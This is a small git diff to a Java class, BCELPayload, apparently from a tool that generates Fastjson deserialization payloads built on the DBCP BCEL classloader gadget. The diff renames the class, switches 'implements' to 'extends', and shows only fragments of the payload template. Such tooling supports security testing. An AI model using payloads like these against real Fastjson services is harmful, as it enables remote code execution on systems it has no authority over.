@@ -2,7 +2,7 @@ package com.ding0x0.fastjson;
 
 import com.ding0x0.Payload;
 
-public class BCELPayload implements Payload {
+public class bcelPayload extends Payload {
 
     public String bcel = "";
     public String template = "[+] dbcp" +
@@ -20,11 +20,11 @@ public class BCELPayload implements Payload {
             "       }:\"x\"\n" +
             "   }";
 
-    public BCELPayload(String bcel){
+    public bcelPayload(String bcel){
         this.bcel = bcel;
     }
 
-    public BCELPayload(){
+    public bcelPayload(){
 
     }
 
